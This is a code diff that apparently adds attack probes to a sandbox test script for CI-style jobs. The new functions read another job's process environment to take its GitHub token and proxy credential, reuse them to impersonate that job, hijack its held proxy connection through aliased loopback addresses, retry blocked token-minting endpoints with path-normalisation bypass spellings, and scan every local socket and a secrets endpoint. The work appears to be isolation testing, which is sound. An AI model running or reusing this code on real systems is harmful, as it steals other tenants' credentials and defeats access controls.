@@ -26,6 +26,8 @@ import os
 import socket
 import sys
 import time
+import urllib.error
+import urllib.parse
 import urllib.request
 
 SOCKS = ["/tmp/hotline-computer/bridge.sock", "/run/hotline-computer/bridge/bridge.sock"]
@@ -398,6 +400,250 @@ def leftover(url, seconds):
     os._exit(0)
 
 
+def proxy_parts(env):
+    """(host, port, credential) of a job's HTTPS_PROXY."""
+    u = urllib.parse.urlsplit(env.get("HTTPS_PROXY") or env.get("https_proxy") or "")
+    return u.hostname or "127.0.0.1", u.port or 3128, urllib.parse.unquote(u.password or "")
+
+
+def connect_through(proxy, credential, target, source=None, timeout=8):
+    """A CONNECT to `target` (host, port) through `proxy` with `credential`,
+    from `source` (address, port) when given. (socket, status line)."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    if source:
+        s.bind(source)
+    s.connect(proxy)
+    auth = base64.b64encode(b"job:" + credential.encode()).decode()
+    s.sendall(f"CONNECT {target[0]}:{target[1]} HTTP/1.1\r\nHost: {target[0]}:{target[1]}\r\n"
+              f"Proxy-Authorization: Basic {auth}\r\n\r\n".encode())
+    head = b""
+    while b"\r\n\r\n" not in head:
+        chunk = s.recv(1)
+        if not chunk:
+            break
+        head += chunk
+    return s, head.split(b"\r\n")[0].decode(errors="replace")
+
+
+def tls_get(s, target, path, token, method="GET", raw_target=None):
+    """One request over TLS on a CONNECTed socket, trusting the job's CA
+    bundle; answers the status code (or the error's name)."""
+    import ssl
+    try:
+        context = ssl.create_default_context(cafile=os.environ.get("SSL_CERT_FILE"))
+        t = context.wrap_socket(s, server_hostname=target[0])
+        t.sendall(f"{method} {raw_target or path} HTTP/1.1\r\nHost: {target[0]}:{target[1]}\r\n"
+                  f"Authorization: Bearer {token}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".encode())
+        head = b""
+        while b"\r\n" not in head:
+            chunk = t.recv(4096)
+            if not chunk:
+                break
+            head += chunk
+        line = head.split(b"\r\n")[0].split()
+        return line[1].decode() if len(line) > 1 else "none"
+    except Exception as e:
+        return type(e).__name__
+
+
+def curl(url, token, env):
+    import subprocess
+    r = subprocess.run(["curl", "-s", "-m8", "-o", "/dev/null", "-w", "%{http_code}", url,
+                        "-H", "Authorization: Bearer " + token], env=env, capture_output=True, text=True)
+    return f"{r.stdout.strip() or 'none'}/{r.returncode}"
+
+
+def pair(url, me, other, seconds):
+    """One of two jobs running at once, J9=<me> and J9=<other>, each with
+    its own stand-in and proxy credential. Each holds a CONNECT of its own
+    open to the bound origin (as a long fetch does), finds the other in
+    /proc, and calls <url> with: its own (the control), the other's proxy
+    credential, the other's stand-in, both, and the other's credential from
+    an address that aliases the other's held connection (127.0.0.N, its
+    local port), which the proxy's owner check is asked about by port.
+    Statuses only, in ~/probe/pair-<me>.out."""
+    end = time.time() + float(seconds)
+    target = urllib.parse.urlsplit(url)
+    target = (target.hostname, target.port or 443)
+    proxy_host, proxy_port, mine = proxy_parts(os.environ)
+    held, said = connect_through((proxy_host, proxy_port), mine, target)
+    rows = [f"HELD {said}"]
+    victim = None
+    while time.time() < end and not victim:
+        for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != os.getpid()]:
+            try:
+                raw = open(f"/proc/{pid}/environ", "rb").read()
+            except Exception:
+                continue
+            if f"J9={other}".encode() not in raw.split(b"\0"):
+                continue
+            env = dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv)
+            if "GH_TOKEN" in env and "HTTPS_PROXY" in env:
+                victim = (int(pid), env)
+                break
+        time.sleep(0.3)
+    if not victim:
+        rows.append("NOOTHER")
+    else:
+        pid, theirs = victim
+        time.sleep(1.5)  # the other's held connection is open by now
+        mine_env = dict(os.environ)
+        cred_env = dict(os.environ, HTTPS_PROXY=theirs["HTTPS_PROXY"], https_proxy=theirs["HTTPS_PROXY"])
+        rows.append("OWN " + curl(url + f"/f2x-own-{me}", os.environ.get("GH_TOKEN", ""), mine_env))
+        rows.append("CRED " + curl(url + f"/f2x-cred-{me}", os.environ.get("GH_TOKEN", ""), cred_env))
+        rows.append("STANDIN " + curl(url + f"/f2x-standin-{me}", theirs["GH_TOKEN"], mine_env))
+        rows.append("BOTH " + curl(url + f"/f2x-both-{me}", theirs["GH_TOKEN"], cred_env))
+        # The other's held connection: its local port, from the socket
+        # table and the other job's own descriptors.
+        inodes = set()
+        for fd in glob.glob(f"/proc/{pid}/task/*/fd/*") + glob.glob(f"/proc/{pid}/fd/*"):
+            try:
+                link = os.readlink(fd)
+            except Exception:
+                continue
+            if link.startswith("socket:["):
+                inodes.add(link[8:-1])
+        ports = []
+        for row in open("/proc/net/tcp").read().splitlines()[1:]:
+            f = row.split()
+            if f[2] == f"0100007F:{proxy_port:04X}" and f[9] in inodes:
+                ports.append(int(f[1].split(":")[1], 16))
+        _, _, theirs_cred = proxy_parts(theirs)
+        got, tries = "none", 0
+        for port in ports:
+            for n in range(2, 40):
+                tries += 1
+                try:
+                    s, line = connect_through((proxy_host, proxy_port), theirs_cred, target, ("127.0.0.%d" % n, port))
+                except Exception as e:
+                    got = type(e).__name__
+                    continue
+                if " 200 " not in line + " ":
+                    got = line.split(" ", 1)[-1][:24]
+                    s.close()
+                    continue
+                got = "connected via 127.0.0.%d, then %s" % (n, tls_get(s, target, f"/f2x-alias-{me}", theirs["GH_TOKEN"]))
+                s.close()
+                break
+            else:
+                continue
+            break
+        rows.append(f"ALIAS ports={ports} tries={tries} last={got}")
+    with open(os.path.expanduser(f"~/probe/pair-{me}.out"), "w") as f:
+        f.write("; ".join(rows) + "\n")
+    while time.time() < end:
+        time.sleep(0.5)
+    held.close()
+
+
+MINTING = ["/app/installations/1/access_tokens", "/authorizations", "/APP/Installations/1/access_tokens",
+           "/app%2Finstallations/1/access_tokens", "//authorizations", "/x/../authorizations",
+           "/authorizations;x", "/authorizations.json", "/%61uthorizations"]
+
+
+def mint(url, tag):
+    """Each key-minting route the delivery refuses, in the spellings a
+    server reads as the same route, through this job's own proxy: by curl
+    (POST), and by a request target in absolute form after a harmless
+    request on the same connection. Statuses only."""
+    import subprocess
+    rows = []
+    for i, path in enumerate(MINTING):
+        r = subprocess.run(["curl", "-s", "-m8", "--path-as-is", "-X", "POST", "-o", "/dev/null", "-w", "%{http_code}",
+                            url + path + ("&" if "?" in path else "?") + f"m={tag}{i}",
+                            "-H", "Authorization: Bearer " + os.environ.get("GH_TOKEN", "")], capture_output=True, text=True)
+        rows.append(f"{i}={r.stdout.strip() or 'none'}")
+    target = urllib.parse.urlsplit(url)
+    target = (target.hostname, target.port or 443)
+    host, port, mine = proxy_parts(os.environ)
+    try:
+        s, line = connect_through((host, port), mine, target)
+        absolute = f"https://{target[0]}:{target[1]}/authorizations?m={tag}abs"
+        rows.append("abs=" + (tls_get(s, target, "", os.environ.get("GH_TOKEN", ""), "POST", absolute) if " 200 " in line + " " else line))
+    except Exception as e:
+        rows.append("abs=" + type(e).__name__)
+    print("MINT " + " ".join(rows))
+
+
+def reach(host, port):
+    """Every TCP and UDP socket listening on this computer and every unix
+    socket accepting connections (paths and abstract names), each tried
+    from this job: connected or refused, and whose it is (the table's
+    owner for TCP, the peer's credentials for unix). Then the host's
+    listener, the allowed way out. One line per endpoint."""
+    import pwd
+    import struct
+
+    def who(uid):
+        try:
+            return pwd.getpwuid(uid).pw_name
+        except Exception:
+            return str(uid)
+
+    def address(hexed, v6):
+        a, p = hexed.split(":")
+        raw = bytes.fromhex(a)
+        if v6:
+            ip = socket.inet_ntop(socket.AF_INET6, b"".join(raw[i:i + 4][::-1] for i in range(0, 16, 4)))
+        else:
+            ip = socket.inet_ntoa(raw[::-1])
+        return ip, int(p, 16)
+
+    seen = set()
+    for table, v6, kind, state in (("tcp", False, "tcp", "0A"), ("tcp6", True, "tcp", "0A"),
+                                   ("udp", False, "udp", "07"), ("udp6", True, "udp", "07")):
+        try:
+            rows = open(f"/proc/net/{table}").read().splitlines()[1:]
+        except Exception:
+            continue
+        for row in rows:
+            f = row.split()
+            if f[3] != state:
+                continue
+            ip, p = address(f[1], v6)
+            if (kind, ip, p) in seen:
+                continue
+            seen.add((kind, ip, p))
+            owner = who(int(f[7]))
+            if kind == "udp":
+                print(f"REACH udp {ip}:{p} owner={owner} bound")
+                continue
+            to = {"0.0.0.0": "127.0.0.1", "::": "::1"}.get(ip, ip)
+            try:
+                socket.create_connection((to, p), timeout=2).close()
+                result = "connected"
+            except Exception as e:
+                result = "refused-" + type(e).__name__
+            print(f"REACH tcp {ip}:{p} owner={owner} {result}")
+    for row in open("/proc/net/unix").read().splitlines()[1:]:
+        f = row.split()
+        if len(f) < 8 or not int(f[3], 16) & 0x10000:
+            continue
+        name = f[7]
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM if f[4] == "0001" else socket.SOCK_SEQPACKET)
+        s.settimeout(2)
+        try:
+            s.connect("\0" + name[1:] if name.startswith("@") else name)
+            pid, uid, _ = struct.unpack("3i", s.getsockopt(socket.SOL_SOCKET, 17, 12))
+            print(f"REACH unix {name} owner={who(uid)} connected")
+        except Exception as e:
+            print(f"REACH unix {name} owner=? refused-{type(e).__name__}")
+        s.close()
+    try:
+        socket.create_connection((host, int(port)), timeout=4).close()
+        print(f"EGRESS {host}:{port} connected")
+    except Exception as e:
+        print(f"EGRESS {host}:{port} refused-{type(e).__name__}")
+    try:
+        r = urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8787/secrets/uses"), timeout=4)
+        print(f"DOOR {r.status}")
+    except urllib.error.HTTPError as e:
+        print(f"DOOR {e.code}")
+    except Exception as e:
+        print(f"DOOR {type(e).__name__}")
+
+
 if __name__ == "__main__":
     cmd = sys.argv[1]
     if cmd == "bridge":
@@ -418,3 +664,9 @@ if __name__ == "__main__":
         xi2(sys.argv[2])
     elif cmd == "leftover":
         leftover(sys.argv[2], sys.argv[3])
+    elif cmd == "pair":
+        pair(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
+    elif cmd == "mint":
+        mint(sys.argv[2], sys.argv[3])
+    elif cmd == "reach":
+        reach(sys.argv[2], sys.argv[3])
